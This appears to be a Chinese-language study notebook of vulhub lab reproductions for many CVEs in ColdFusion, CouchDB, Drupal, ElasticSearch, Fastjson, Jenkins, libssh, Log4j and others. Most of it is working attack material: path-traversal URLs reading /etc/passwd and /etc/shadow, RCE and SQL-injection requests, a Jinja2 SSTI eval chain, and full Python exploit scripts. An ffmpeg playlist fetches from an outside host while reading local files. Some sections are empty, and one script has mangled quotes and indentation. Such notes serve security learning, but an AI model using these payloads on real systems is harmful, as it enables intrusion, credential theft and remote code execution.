# vulhub 

## [CVE-2010-2861](https://blog.csdn.net/JiangBuLiu/article/details/93997549)

### 漏洞复现

**访问**
```
http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，
```

即可读取文件/etc/passwd


**读取后台管理员密码**
```
http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en

```

## [CVE-2017-3066](https://blog.csdn.net/JiangBuLiu/article/details/94001479)

### 
 n

### 漏洞复现

我们使用参考链接中的[ColdFusionPwn](https://github.com/codewhitesec/ColdFusionPwn)工具来生成POC：

```
java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser
```

# [CVE-2019-3396路径穿越与命令执行漏洞](https://blog.csdn.net/JiangBuLiu/article/details/94001479)











# [Couchdb 垂直权限绕过漏洞（CVE-2017-12635）](https://www.cnblogs.com/foe0/p/11375757.html)

## [Couchdb 垂直权限绕过漏洞（CVE-2017-12635）](https://vulhub.org/#/environments/couchdb/CVE-2017-12635/)

###漏洞复现

首先，发送如下数据包：
```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
}
```

> 发送包含两个`roles`的数据包，即可绕过限制：
```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```

> 再次访问
```
http://your-ip:5984/_utils/
```
，输入账户密码vulhub，可以成功登录：



# [CVE-2017-12636](https://vulhub.org/#/environments/couchdb/CVE-2017-12636/)




# [Discuz 7.x/6.x 全局变量防御绕过导致代码执行](https://vulhub.org/#/environments/discuz/wooyun-2010-080723/)

## 漏洞复现

安装成功后，直接找一个已存在的帖子，向其发送数据包，并在

`Cookie`中替换：
```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();：
```


# [Discuz!X ≤3.4 任意文件删除漏洞](https://vulhub.org/#/environments/discuz/x3.4-arbitrary-file-deletion/)





# [Django debug page XSS漏洞分析](https://vulhub.org/#/environments/django/CVE-2017-12794/)

## 漏洞复现

访问
```
http://your-ip:8000/create_user/?username=<script>alert(1)</script>
```

创建一个用户，成功；再次访问
```
http://your-ip:8000/create_user/?username=<script>alert(1)</script>
```
触发异常：

可见，Postgres抛出的异常为
```
duplicate key value violates unique constraint "xss_user_username_key"
DETAIL:  Key (username)=(<script>alert(1)</script>) already exists.
```

这个异常被拼接进T
```
he above exception ({{ frame.exc_cause }}) was the direct cause of the following exception
```
最后触发XSS。


# **[Django < 2.0.8 任意URL跳转漏洞（CVE-2018-14574）](https://github.com/vulhub/vulhub/blob/master/django/CVE-2018-14574/README.zh-cn.md)**

## 详情：

> Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，`Django默认会跳转到带/的请求中`。


# **[Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）](https://github.com/vulhub/vulhub/blob/master/django/CVE-2019-14234/README.zh-cn.md)**

## 描述：

> Django在2019年8月1日发布了一个安全更新，修复了在JSONField、HStoreField两个模型字段中存在的SQL注入漏洞。

```
http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123

```

# [CVE-2014-3704](https://vulhub.org/#/environments/drupal/CVE-2014-3704/)


## Drupal 是一款用量庞大的CMS，

其`7.0~7.31`版本中存在一处无需认证的`SQL漏洞`。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。


```
POST /?q=node&destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a
```

# **[Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）](https://vulhub.org/#/environments/drupal/CVE-2017-6920/)**

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id

```



# [Drupal 远程代码执行漏洞（CVE-2018-7602）](https://vulhub.org/#/environments/drupal/CVE-2018-7602/)

## 漏洞复现

参考pimps/CVE-2018-7600的PoC。


### 影响软件：drupal

### 方式：对URL中的#进行编码两次，绕过sanitize()函数过滤

### 效果：任意命令执行

 "id"为要执行的命令 第一个drupal为用户名 第二个drupal为密码

 ```
python3 drupa7-CVE-2018-7602.py -c "id" drupal drupal http://127.0.0.1:8081/
```

# **[Drupal XSS漏洞（CVE-2019-6341）](https://vulhub.org/#/environments/drupal/CVE-2019-6341/)**

## 影响软件：

> Drupal

## 方式：

> 通过文件模块
或者子系统上传恶
意文件触发XSS漏洞



## 参考链接[Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)：

> Drupal 1-click to RCE 分析
效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）


# **[ECShop 2.x/3.x SQL注入/任意代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md)**



# [ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/)

## 漏洞原理:

> ElasticSearch有脚本执行的功能，使用的引擎为MVEL，该引擎没有做任何的防护，或者沙盒包装，所以可以直接执行任意代码。

> 由于在ElasticSearch的默认配置下，动态脚本执行功能处于打开状态，导致用户可以构造恶意的请求包，`执行任意代码。`


## 漏洞复现：

> 1. 首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```
> 2. 然后，执行任意代码：
```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

# **[ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/)** 

## 漏洞原理


ElasticSearch是一个JAVA开发的搜索分析引擎。

2014年，曾经被曝出过一个 远程代码执行漏洞（CVE-2014-3120） ，漏洞出现在脚本查询模块，由于搜索引擎支持使用脚本代码（MVEL），作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意java代码，

>后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。



## 漏洞复现：

以为分两种环境所以有两种POC：

**Java沙盒绕过法**：
```
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()
```

> 由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

> 然后发送包含payload的数据包，执行任意命令：

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```




**Goovy直接执行命令法**

```
def command='id';def res=command.execute().text;res
```

> 由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：


POC:
```
POST http://target:9200/_search?pretty 
{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}
```

# **[ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/)**

## 漏洞原理

```
在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。
```

**插件链接**：

默认安装了一个插件：elasticsearch-head，主页在此：**[elasticsearch-head](https://github.com/mobz/elasticsearch-head)**


## 漏洞复现：

```
GET /_plugin/head/../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.100.85:9200
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2
```


# **[ElasticSearch 目录穿越漏洞（CVE-2015-5531）](https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/)**

## 漏洞原理：

**参考**：
**[CVE-2015-5531](https://www.freebuf.com/vuls/99942.html)**

## **[漏洞复现](https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/)**

## **1. 新建一个仓库**

```
PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test" 
    }
}
```

## **[2. 创建一个快照]**

```
PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
    }
}
```

## **[目录穿越读取任意文件]**

**访问：**
```
http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

```


## CVE-2015-5531.py
```
#!/usr/bin/env python
# -*- coding:utf8 -*-
"""
PoC for CVE-2015-5531
Affects ElasticSearch 1.6.0 and prior
"""
import re
import sys
import json
import requests
import urllib
import argparse
import traceback
import termcolor
def colorize_red(string):
    """
    :param string:
    :return
    """
    return termcolor.colored(string, 'red')
def colorize_green(string):
    """
    :param string:
    :return:
    """
    return termcolor.colored(string, 'green')
def create_repos(base_url):
    """
    :param base_url:
    :return: None
    """
    for index, repo_name in enumerate(REPO_NAME_LST):
        
        url = "{0}{1}".format(base_url, repo_name)
        req = requests.post(url, json=DATA_REPO_LST[index])
         
        if “acknowledged” in req.json():
            print colorize_green(“repository {0}: create success”.format(repo_name))
def grab_file(vuln_url):
    “”"
    :param xplurl:
    :return:
    “”"
    
    req = requests.get(vuln_url)
    if req.status_code == 400:
        data = req.json()
        extrdata = re.findall(r’\d+’, str(data['error']))
        decoder = bytearray()
        for i in extrdata[2:]:
            decoder.append(int(i))
        print colorize_green(decoder)
def exploit(**args):
    “”"
    :param args:
    :return:
    “”"
    target = args['target']
    port = args['port']
    fpath = args['fpath'].split(‘,’)
    fpath = [urllib.quote(fp, safe='') for fp in fpath]
    base_url = “http://{0}:{1}/_snapshot/”.format(target, port)
    #create elasticsearch repository for snapshot
    create_repos(base_url)
    #grab files
    for fp in fpath:
        vuln_url = ‘{0}{1}/{2}{3}’.format(base_url, REPO_NAME_LST[0], FCK, fp)
        print colorize_red(urllib.unquote(fp)) + “:\n”
        grab_file(vuln_url)
if __name__ == “__main__”:
    # for global
    FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’
    REPO_NAME_LST = ['test11', 'test12']
 
   DATA_REPO_LST = [{"type": "fs", "settings": {"location": 
"/tmp/test30"}}, {"type": "fs", "settings": {"location": 
"/tmp/test30/snapshot-backdata"}}]
    parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”,
                                     description=”cve-2015-5531 Vuln PoC”, add_help=True)
    parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’)
 
   parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’, 
type=int, default=9200, help=’elasticsearch port default 9200′)
   
 parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str,
 default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files 
separated by comma ‘)
    args = parser.parse_args()
    try:
        exploit(**args.__dict__)
    except:
        traceback.print_exc()

```

# **[Elasticsearch写入webshell漏洞（WooYun-2015-110216）](https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/)**


## **漏洞原理**

ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。

所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。

## **漏洞复现**

> 访问
`http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp`
这就是我们写入的webshell。

该shell的作用是向`wwwroot下的test.jsp文件中写入任意字符串`，如：

```
http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success
```

我们再访问`/wwwroot/test.jsp就能看到success`了：

# **[Electron < v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】](https://vulhub.org/#/environments/electron/CVE-2018-1000006/)**


## **[漏洞原理](https://xz.aliyun.com/t/1990)**

基于electron构建的app登记了协议，即可以使用该协议直接打开应用程序。
影响win平台


## **[漏洞复现](https://github.com/vulhub/vulhub/blob/master/electron/CVE-2018-1000006/README.zh-cn.md)**

```
vulhub://?" "--no-sandbox" "--renderer-cmd-prefix=cmd.exe /c start calc
```
```
vulhub://example.com/" "--no-Sandbox" "--gpu-launcher=calc.exe
```

# **[Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）](https://github.com/vulhub/vulhub/blob/master/electron/CVE-2018-15685/README.zh-cn.md)**

## **漏洞复现**

> 此时，提交POC（`Windows`）：

```
<img src=1 onerror="window.open().open('data:text/html,<script>require(\'child_process\').exec(\'calc.exe\')</script>');">
```

# **[fastjson 反序列化导致任意命令执行漏洞](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)**

# **[Fastjson 1.2.47 远程命令执行漏洞](https://vulhub.org/#/environments/fastjson/1.2.47-rce/)**

# **[ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）](http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)**

## **漏洞原理：**

```
如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。
```

# **[CVE-2016-1897](http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)**

## **漏洞说明**

FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(https://www.ffmpeg.org/ffmpeg-protocols.html#concat )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件

## **[构造文件：](http://www.vuln.cn/6151)**

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://dx.su/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```


# **[ffmpeg 任意文件读取漏洞环境 (CVE-2017-9993)](https://vulhub.org/#/environments/ffmpeg/phdays/)**


## **[漏洞原理](https://vulhub.org/#/environments/ffmpeg/phdays/)**

> 生成exp.avi，在http://your-ip:8080/上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：



# **[fastjson 反序列化导致任意命令执行漏洞](https://vulhub.org/#/environments/fastjson/vuln/)**














# **[Fastjson 1.2.47 远程命令执行漏洞](https://vulhub.org/#/environments/fastjson/1.2.47-rce/)**

## 什么是Fastjson ：

> Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。


## **[漏洞利用POC](https://github.com/jas502n/fastjson-RCE)**

```
javac Exploit.java


import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        exec("xterm");
        return null;
    }

    public static String exec(String cmd) {
        try {
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static void main(String[] args) {
        exec("123");
    }
}
```

# **[ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）]()**

## **[漏洞分析和实现](http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)**


# **[Flask（Jinja2） 服务端模板注入漏洞](https://vulhub.org/#/environments/flask/ssti/)**

## 漏洞验证：

访问

- http://your-ip:8000/?name={{233*233}}

> 得到54289，说明SSTI漏洞存在。

获取eval函数并执行任意python代码的POC：

```py
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```


访问：
```
/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

# **[PHP-FPM Fastcgi 未授权访问漏洞](https://vulhub.org/#/environments/fpm/)**

**[POC](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)**:


# **[GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）](https://vulhub.org/#/environments/ghostscript/CVE-2019-6116/)**

## **漏洞利用:**

**[POC](https://github.com/vulhub/vulhub/blob/master/ghostscript/CVE-2019-6116/poc.png)**:

> 说明：作者给出了POC，上传这个文件，即可执行`id > /tmp/success`

[](img/poc.png)

[](img/2.png)

# **[GIT-SHELL 沙盒绕过（CVE-2017-8386）](https://vulhub.org/#/environments/git/CVE-2017-8386/)**


## 漏洞复现：

> 打开gitea，找到刚才创建的公开项目，如vulhub/repo，发送如下数据包，添加一个Git LFS对象：

```
POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
```


然后，访问
```
http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth
```

即可看到/etc/passwd已被成功读取：

#**[ Gitlab 任意文件读取漏洞（CVE-2016-9086）](https://vulhub.org/#/environments/gitlab/CVE-2016-9086/)**


## 漏洞复现：

将
**[test.tar.gz](https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2016-9086/test.tar.gz)**
上传，将会读取到`/etc/passwd`文件内容：


# **[gitlist 0.6.0 远程命令执行漏洞](https://vulhub.org/#/environments/gitlist/0.6.0-rce/)**




## **[Glassfish 任意文件读取漏洞](https://vulhub.org/#/environments/glassfish/4.1.0/)**


## **漏洞原理**：

java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/`来向上跳转，达到目录穿越、任意文件读取的效果。

## **漏洞复现**:

在输入框中输入：
```
/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```


# **[Gogs 任意用户登录漏洞（CVE-2018-18925）](https://vulhub.org/#/environments/gogs/CVE-2018-18925/)**

# **[漏洞原理](https://xz.aliyun.com/t/3168)**

## **[漏洞利用](https://www.anquanke.com/post/id/163575)**

通过这个附件的URL，得知这个文件的文件名：`./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10。`

然后，构造Cookie
`i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10`，访问即可发现已经成功登录id=1的用户（即管理员）：


# **[Hadoop YARN ResourceManager 未授权访问](https://vulhub.org/#/environments/hadoop/unauthorized-yarn/)**


## **[漏洞利用](https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html)**





# **[OpenSSH 用户名枚举漏洞（CVE-2018-15473）](https://vulhub.org/#/environments/openssh/CVE-2018-15473/)**

## **漏洞利用**

使用`CVE-2018-15473-Exploit`，枚举字典中的用户名：

EXP：

`https://github.com/Rhynorater/CVE-2018-15473-Exploit`


> **python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt `your-ip`**







# **[HTTPoxy漏洞（CVE-2016-5385）](https://vulhub.org/#/environments/cgi/httpoxy/)**



# **[Imagetragick Command Execution Vulnerability (CVE-2016–3714)](https://vulhub.org/#/environments/jboss/JMXInvokerServlet-deserialization/)**



# **[Imagetragick 命令执行漏洞（CVE-2016–3714）](https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md)**


## **[漏洞测试：](https://github.com/ImageTragick/PoCs)**


# **[JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）](https://vulhub.org/#/environments/jboss/CVE-2017-12149/)**

## 漏洞复现

该漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化：

## [工具jackson使用](http://jackson.thuraisamy.me/runtime-exec-payloads.html)


# **[JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）](https://vulhub.org/#/environments/jboss/CVE-2017-7504/)**


## **漏洞实现**

参考利用工具
[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)，

我们选择一个Gadget：ExampleCommonsCollections1WithHashMap，编译并生成序列化数据：

```
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "touch /tmp/success"
```

可见，我们执行的命令是
`touch /tmp/success。`

执行完成后，将生成一个文件`ExampleCommonsCollections1WithHashMap.ser`，将该文件作为body发送如下数据包：

```
curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

执行docker-compose exec jboss bash进入容器，可见/tmp/success已成功创建。


# **[Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）](https://vulhub.org/#/environments/jenkins/CVE-2017-1000353/)**

## **[漏洞信息](https://github.com/vulhub/CVE-2017-1000353)**



## 漏洞利用：

 1. 首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)
 ，这是生成POC的工具。

执行下面命令，生成字节码文件：

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
```
> 执行上述代码后，生成jenkins_poc.ser文件，这就是序列化字符串。


**二.发送数据包，执行命令**

下载exploit.py，python3执行`python exploit.py http://your-ip:8080 jenkins_poc.ser`，将刚才生成的字节码文件发送给目标：

 发现`/tmp/success`成功被创建，说明命令执行漏洞利用成功：


# **[Jenkins远程命令执行漏洞（CVE-2018-1000861）](https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/)**

## **[漏洞复现](https://github.com/orangetw/awesome-jenkins-rce-2019)**

发送下面请求:

```
http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
  public x(){
    "touch /tmp/success".execute()
  }
}
```

/tmp/success已成功创建：

# **[Jupyter Notebook 未授权访问漏洞](https://vulhub.org/#/environments/jupyter/notebook-rce/)**


# **[libssh Authentication Bypass Vulnerability(CVE-2018-10933)](https://github.com/vulhub/vulhub/blob/master/libssh/CVE-2018-10933/README.zh-cn.md)**

## **[漏洞复现](https://www.seebug.org/vuldb/ssvid-97614)**

```
#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.debug("Unable to connect.")

    return None


if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
```



#**[ Apache Log4j Server 反序列化命令执行漏洞（CVE-2017-5645）](https://vulhub.org/#/environments/log4j/CVE-2017-5645/)**


 ## **漏洞复现**

我们使用`ysoserial`生成payload，然后直接发送给your-ip:4712端口即可。

```
java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 "touch /tmp/success" | nc your-ip 4712
```
然后执行docker-compose exec log4j bash进入容器，可见 /tmp/success 已成功创


# Magento 2.2 SQL注入漏洞



## [漏洞复现](https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html)

分别访问如下链接：

```
